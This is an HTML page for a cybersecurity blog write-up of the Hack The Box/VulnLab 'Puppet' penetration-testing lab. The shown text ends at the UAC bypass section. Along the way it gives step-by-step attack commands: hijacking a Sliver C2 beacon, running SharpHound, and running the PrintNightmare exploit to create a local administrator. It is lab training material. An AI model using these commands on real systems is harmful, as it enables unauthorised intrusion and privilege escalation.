@@ -1,0 +1,522 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Puppet ProLab&#x2F;Chain from Hack The Box - VulnLab Pentesting Walkthrough &amp; WriteupIntroductionThis comprehensive walkthrough documents the complete penetration testing process for the “Puppet C">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VL-Puppet">
+<meta property="og:url" content="https://panosoikogr.github.io/2025/11/04/VL-Puppet/index.html">
+<meta property="og:site_name" content="Panosoiko Cybersecurity Blog">
+<meta property="og:description" content="Puppet ProLab&#x2F;Chain from Hack The Box - VulnLab Pentesting Walkthrough &amp; WriteupIntroductionThis comprehensive walkthrough documents the complete penetration testing process for the “Puppet C">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Puppet/anon_ftp.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Puppet/sliver_client_conf.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Puppet/mult_acces_sliver.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Puppet/active_beacon.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Puppet/usng_beacon.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Puppet/ruby_is_running.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Puppet/potential_kerberoastbale_target.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Puppet/bloodhound.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Puppet/files_share.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Puppet/admins_but_not_elv_token.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Puppet/nt_authority.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Puppet/full_admin.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Puppet/svc_puppet_win.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Puppet/t1_admins.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Puppet/beacon_as_svc.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Puppet/enumaration_share.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Puppet/ssh_key.png">
+<meta property="article:published_time" content="2025-11-04T12:13:42.000Z">
+<meta property="article:modified_time" content="2025-11-04T12:18:13.852Z">
+<meta property="article:author" content="Panosoiko">
+<meta property="article:tag" content="Chain">
+<meta property="article:tag" content="Hack The Box">
+<meta property="article:tag" content="ProLab">
+<meta property="article:tag" content="VunlLab">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://panosoikogr.github.io/images/Puppet/anon_ftp.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/android-chrome-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>VL-Puppet</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-73BMC8ZHB7"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-73BMC8ZHB7');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 8.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/11/02/HS-Slayer/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2025/11/04/VL-Puppet/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2025/11/04/VL-Puppet/&text=VL-Puppet"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2025/11/04/VL-Puppet/&title=VL-Puppet"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2025/11/04/VL-Puppet/&is_video=false&description=VL-Puppet"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VL-Puppet&body=Check out this article: https://panosoikogr.github.io/2025/11/04/VL-Puppet/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2025/11/04/VL-Puppet/&title=VL-Puppet"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2025/11/04/VL-Puppet/&title=VL-Puppet"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2025/11/04/VL-Puppet/&title=VL-Puppet"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2025/11/04/VL-Puppet/&title=VL-Puppet"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2025/11/04/VL-Puppet/&name=VL-Puppet&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2025/11/04/VL-Puppet/&t=VL-Puppet"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Puppet-ProLab-Chain-from-Hack-The-Box-VulnLab-Pentesting-Walkthrough-Writeup"><span class="toc-number">1.</span> <span class="toc-text">Puppet ProLab&#x2F;Chain from Hack The Box - VulnLab Pentesting Walkthrough &amp; Writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Introduction"><span class="toc-number">1.1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Reconnaissance"><span class="toc-number">1.2.</span> <span class="toc-text">Initial Reconnaissance</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Port-Scanning"><span class="toc-number">1.2.1.</span> <span class="toc-text">Port Scanning</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Accessing-the-Sliver-C2-Framework"><span class="toc-number">1.3.</span> <span class="toc-text">Accessing the Sliver C2 Framework</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#FTP-Enumeration"><span class="toc-number">1.3.1.</span> <span class="toc-text">FTP Enumeration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Configuring-the-Sliver-Client"><span class="toc-number">1.3.2.</span> <span class="toc-text">Configuring the Sliver Client</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Beacon-Access"><span class="toc-number">1.4.</span> <span class="toc-text">Initial Beacon Access</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Spawning-an-Interactive-Session"><span class="toc-number">1.4.1.</span> <span class="toc-text">Spawning an Interactive Session</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Active-Directory-Enumeration"><span class="toc-number">1.5.</span> <span class="toc-text">Active Directory Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SMB-Share-Enumeration"><span class="toc-number">1.6.</span> <span class="toc-text">SMB Share Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation-Discovery"><span class="toc-number">1.7.</span> <span class="toc-text">Privilege Escalation Discovery</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PrintNightmare-Vulnerability"><span class="toc-number">1.7.1.</span> <span class="toc-text">PrintNightmare Vulnerability</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploiting-PrintNightmare"><span class="toc-number">1.7.2.</span> <span class="toc-text">Exploiting PrintNightmare</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#UAC-Bypass"><span class="toc-number">1.8.</span> <span class="toc-text">UAC Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Setting-up-the-UAC-Bypass-Extension"><span class="toc-number">1.8.1.</span> <span class="toc-text">Setting up the UAC Bypass Extension</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Credential-Dumping-with-Mimikatz"><span class="toc-number">1.9.</span> <span class="toc-text">Credential Dumping with Mimikatz</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lateral-Movement-via-Token-Impersonation"><span class="toc-number">1.10.</span> <span class="toc-text">Lateral Movement via Token Impersonation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Domain-Controller-Enumeration"><span class="toc-number">1.11.</span> <span class="toc-text">Domain Controller Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cracking-the-SSH-Private-Key"><span class="toc-number">1.12.</span> <span class="toc-text">Cracking the SSH Private Key</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Establishing-SSH-Access"><span class="toc-number">1.12.1.</span> <span class="toc-text">Establishing SSH Access</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux-Privilege-Escalation"><span class="toc-number">1.13.</span> <span class="toc-text">Linux Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Gaining-Root-Access"><span class="toc-number">1.13.1.</span> <span class="toc-text">Gaining Root Access</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Puppet-Infrastructure-Enumeration"><span class="toc-number">1.14.</span> <span class="toc-text">Puppet Infrastructure Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Domain-Controller-Compromise-via-Puppet"><span class="toc-number">1.15.</span> <span class="toc-text">Domain Controller Compromise via Puppet</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        VL-Puppet
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Panosoiko</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-11-04T12:13:42.000Z" class="dt-published" itemprop="datePublished">2025-11-04</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Chain/" rel="tag">Chain</a>, <a class="p-category" href="/tags/Hack-The-Box/" rel="tag">Hack The Box</a>, <a class="p-category" href="/tags/ProLab/" rel="tag">ProLab</a>, <a class="p-category" href="/tags/VunlLab/" rel="tag">VunlLab</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="Puppet-ProLab-Chain-from-Hack-The-Box-VulnLab-Pentesting-Walkthrough-Writeup"><a href="#Puppet-ProLab-Chain-from-Hack-The-Box-VulnLab-Pentesting-Walkthrough-Writeup" class="headerlink" title="Puppet ProLab&#x2F;Chain from Hack The Box - VulnLab Pentesting Walkthrough &amp; Writeup"></a>Puppet ProLab&#x2F;Chain from Hack The Box - VulnLab Pentesting Walkthrough &amp; Writeup</h1><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>This comprehensive walkthrough documents the complete penetration testing process for the “Puppet Chain” machine from HackTheBox and VulnLab. This multi-stage exploitation challenge involves leveraging Sliver C2 framework, exploiting PrintNightmare vulnerability (CVE-2021-34527), performing Active Directory enumeration with BloodHound, and achieving domain compromise through Puppet configuration management exploitation.</p>
+<p><strong>Key Tools Used:</strong> Nmap, FTP, Sliver C2 Framework, SharpHound, BloodHound, Mimikatz, John the Ripper, SSH, Puppet, PrivescCheck, and various COFF loaders.</p>
+<p><strong>Difficulty:</strong> Advanced<br><strong>Topics Covered:</strong> Multi-player C2 operations, privilege escalation, UAC bypass, credential dumping, lateral movement, Active Directory exploitation, and infrastructure automation abuse.</p>
+<hr>
+<h2 id="Initial-Reconnaissance"><a href="#Initial-Reconnaissance" class="headerlink" title="Initial Reconnaissance"></a>Initial Reconnaissance</h2><h3 id="Port-Scanning"><a href="#Port-Scanning" class="headerlink" title="Port Scanning"></a>Port Scanning</h3><p>Only machine 3 is reachable from our initial position. Running an Nmap scan reveals several interesting services:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE    REASON         VERSION</span><br><span class="line">21/tcp    open  ftp        syn-ack ttl 63 vsftpd 3.0.5</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:10.8.5.195</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 2</span><br><span class="line">|      vsFTPd 3.0.5 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">| -rw----r--    1 0        0            2119 Oct 11  2024 red_127.0.0.1.cfg</span><br><span class="line">|_-rwxr-xr-x    1 0        0        36515304 Oct 12  2024 sliver-client_linux</span><br><span class="line">22/tcp    open  ssh        syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10</span><br><span class="line">8140/tcp  open  ssl/http   syn-ack ttl 63 WEBrick httpd 1.7.0 (Ruby 3.0.2 (2021-</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">| ssl-cert: Subject: commonName=puppet.puppet.vl</span><br><span class="line">| Subject Alternative Name: DNS:puppet, DNS:puppet.puppet.vl</span><br><span class="line">| Issuer: commonName=Puppet CA: pm01</span><br><span class="line">31337/tcp open  ssl/Elite? syn-ack ttl 63</span><br><span class="line">| ssl-cert: Subject: commonName=multiplayer</span><br><span class="line">| Subject Alternative Name: DNS:multiplayer</span><br><span class="line">| Issuer: commonName=operators</span><br><span class="line">| Public Key type: ec</span><br><span class="line">| Public Key bits: 384</span><br><span class="line">| Signature Algorithm: ecdsa-with-SHA512</span><br><span class="line">| Not valid before: 2024-05-11T12:31:48</span><br><span class="line">| Not valid after:  2027-05-11T12:31:48</span><br><span class="line">| MD5:   d3f7:f0d9:206f:215a:508a:25b1:4088:67d8</span><br><span class="line">| SHA-1: ce52:0a15:d14d:f022:22b4:1699:7b84:5688:9c9d:8959</span><br></pre></td></tr></table></figure>
+
+<p>The scan reveals anonymous FTP access is enabled, and we can see two particularly interesting files available.</p>
+<hr>
+<h2 id="Accessing-the-Sliver-C2-Framework"><a href="#Accessing-the-Sliver-C2-Framework" class="headerlink" title="Accessing the Sliver C2 Framework"></a>Accessing the Sliver C2 Framework</h2><h3 id="FTP-Enumeration"><a href="#FTP-Enumeration" class="headerlink" title="FTP Enumeration"></a>FTP Enumeration</h3><p>Let’s connect to the FTP service anonymously:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp 10.10.148.71</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Puppet/anon_ftp.png" alt="Anonymous FTP Access"></p>
+<p>Inside the FTP server, we discover two critical files:</p>
+<ul>
+<li><code>red_127.0.0.1.cfg</code> - A Sliver client configuration file</li>
+<li><code>sliver-client_linux</code> - The Sliver client binary</li>
+</ul>
+<p>After a quick search, we find that these are exactly what we need to access a multi-player Sliver session. Reference: <a target="_blank" rel="noopener" href="https://sliver.sh/docs?name=Multi-player+Mode">Sliver Multi-player Mode Documentation</a></p>
+<h3 id="Configuring-the-Sliver-Client"><a href="#Configuring-the-Sliver-Client" class="headerlink" title="Configuring the Sliver Client"></a>Configuring the Sliver Client</h3><p>Before importing the configuration, we need to modify the <code>red_127.0.0.1.cfg</code> file so the LHOST points to the Linux machine we scanned:</p>
+<p><img src="/images/Puppet/sliver_client_conf.png" alt="Sliver Client Configuration"></p>
+<p>Now we can import the configuration:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./sliver-client_linux import ./red_127.0.0.1.cfg</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Puppet/mult_acces_sliver.png" alt="Multiple Access to Sliver"></p>
+<p>Success! We now have access to the Sliver C2 infrastructure and can see an active beacon on one of the previously unreachable machines.</p>
+<hr>
+<h2 id="Initial-Beacon-Access"><a href="#Initial-Beacon-Access" class="headerlink" title="Initial Beacon Access"></a>Initial Beacon Access</h2><p><img src="/images/Puppet/active_beacon.png" alt="Active Beacon"></p>
+<p>We have an active beacon on one of the machines that was unreachable during our initial scan. Let’s interact with it:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use</span><br></pre></td></tr></table></figure>
+
+<p>Then retrieve information about the target:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Puppet/usng_beacon.png" alt="Using the Beacon"></p>
+<p>From the information gathered, we can see that we have a session as user <code>Bruce.Smith</code>. Running the <code>ps</code> command reveals that Ruby is installed and running on the target machine:</p>
+<p><img src="/images/Puppet/ruby_is_running.png" alt="Ruby is Running"></p>
+<h3 id="Spawning-an-Interactive-Session"><a href="#Spawning-an-Interactive-Session" class="headerlink" title="Spawning an Interactive Session"></a>Spawning an Interactive Session</h3><p>To avoid waiting for the beacon callback interval, let’s spawn an interactive session:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">interactive</span><br></pre></td></tr></table></figure>
+
+<p>Then type <code>use</code> again, and you’ll see a session appear after some time.</p>
+<hr>
+<h2 id="Active-Directory-Enumeration"><a href="#Active-Directory-Enumeration" class="headerlink" title="Active Directory Enumeration"></a>Active Directory Enumeration</h2><p><img src="/images/Puppet/potential_kerberoastbale_target.png" alt="Potential Kerberoastable Target"></p>
+<p>We identified a potentially Kerberoastable user: <code>svc_inventory_win</code>. Let’s perform comprehensive Active Directory enumeration using SharpHound.</p>
+<p>Navigate to Bruce Smith’s home directory and execute:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sharp-hound-4 -- &#x27;-c all,GPOLocalGroup&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Puppet/bloodhound.png" alt="BloodHound Collection"></p>
+<p>Download the collected data:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">download 20250425041522_BloodHound.zip</span><br></pre></td></tr></table></figure>
+
+<p>BloodHound didn’t immediately reveal any obvious exploitation paths, so we’ll pivot to examining network shares accessible by our current user.</p>
+<hr>
+<h2 id="SMB-Share-Enumeration"><a href="#SMB-Share-Enumeration" class="headerlink" title="SMB Share Enumeration"></a>SMB Share Enumeration</h2><p>Let’s enumerate available shares:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sliver (puppet-mtls) &gt; sa-netshares 10.10.148.70</span><br><span class="line"></span><br><span class="line">[*] Successfully executed sa-netshares (coff-loader)</span><br><span class="line">[*] Got output:</span><br><span class="line">Share: </span><br><span class="line">---------------------10.10.148.70----------------------------------</span><br><span class="line">ADMIN$</span><br><span class="line">C$</span><br><span class="line">files</span><br><span class="line">IPC$</span><br></pre></td></tr></table></figure>
+
+<p>Now let’s examine the contents of the <code>files</code> share:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sa-dir \\\\10.10.148.70\\files</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Puppet/files_share.png" alt="Files Share"></p>
+<p>We have access to several folders. Inside the IT share, we discover an MSI file for a Puppet agent:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sa-dir \\\\10.10.148.70\\files\\IT</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[*] Successfully executed sa-dir (coff-loader)</span><br><span class="line">[*] Got output:</span><br><span class="line">Contents of \\10.10.148.70\files\IT\*:</span><br><span class="line">        10/12/2024 01:50           &lt;dir&gt; .</span><br><span class="line">        10/12/2024 01:26           &lt;dir&gt; ..</span><br><span class="line">        10/11/2024 05:52        32794112 puppet-agent-x64-latest.msi</span><br><span class="line">                                32794112 Total File Size for 1 File(s)</span><br><span class="line">                                                              2 Dir(s)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Privilege-Escalation-Discovery"><a href="#Privilege-Escalation-Discovery" class="headerlink" title="Privilege Escalation Discovery"></a>Privilege Escalation Discovery</h2><p>Before diving deeper into the Puppet infrastructure, let’s run some enumeration tools to identify easy privilege escalation paths:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sa-adcs-enum</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sa-netstat</span><br></pre></td></tr></table></figure>
+
+<p>Neither revealed immediately useful information. Let’s upload and run PrivescCheck:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload ../Tools/PrivescCheck.ps1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sharpsh -t 300 -- -c invoke-privesccheck -u C:\\Temp\\PrivescCheck.ps1</span><br></pre></td></tr></table></figure>
+
+<h3 id="PrintNightmare-Vulnerability"><a href="#PrintNightmare-Vulnerability" class="headerlink" title="PrintNightmare Vulnerability"></a>PrintNightmare Vulnerability</h3><p>PrivescCheck reveals a critical finding:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Policy      : Limits print driver installation to Administrators</span><br><span class="line">Key         : HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint</span><br><span class="line">Value       : RestrictDriverInstallationToAdministrators</span><br><span class="line">Data        : 0</span><br><span class="line">Default     : 1</span><br><span class="line">Expected    : &lt;null|1&gt;</span><br><span class="line">Description : Installing printer drivers does not require administrator privileges.</span><br><span class="line">[*] Status: Vulnerable - Severity: High - Execution time: 00:00:00.166</span><br></pre></td></tr></table></figure>
+
+<p>This machine is vulnerable to PrintNightmare (CVE-2021-34527)! Reference: <a target="_blank" rel="noopener" href="https://github.com/JohnHammond/CVE-2021-34527">CVE-2021-34527 PoC</a></p>
+<h3 id="Exploiting-PrintNightmare"><a href="#Exploiting-PrintNightmare" class="headerlink" title="Exploiting PrintNightmare"></a>Exploiting PrintNightmare</h3><p>Upload the exploit:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload ../Tools/CVE-2021-34527.ps1</span><br></pre></td></tr></table></figure>
+
+<p>Execute the exploit to create a new administrator user:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sharpsh -i -s -t 1000 -- -u CVE-2021-34527.ps1 -c Invoke-Nightmare</span><br></pre></td></tr></table></figure>
+
+<p>The exploit successfully adds a new user with credentials: <code>adm1n</code> &#x2F; <code>P@ssw0rd</code></p>
+<p>Now let’s spawn a process as this new admin user:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">runas -u adm1n -P &quot;P@ssw0rd&quot; -p c:\\programdata\\puppet\\puppet-update.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Puppet/admins_but_not_elv_token.png" alt="Admins but not Elevated Token"></p>
+<hr>
+<h2 id="UAC-Bypass"><a href="#UAC-Bypass" class="headerlink" title="UAC Bypass"></a>UAC Bypass</h2><p>We successfully created a user in the local administrators group, but we don’t have an elevated token. We need to bypass UAC to gain a fully privileged session. </p>
+<p>Reference: <a target="_blank" rel="noopener" href="https://github.com/icyguider/UAC-BOF-Bonanza?tab=readme-ov-file">UAC-BOF-Bonanza</a></p>
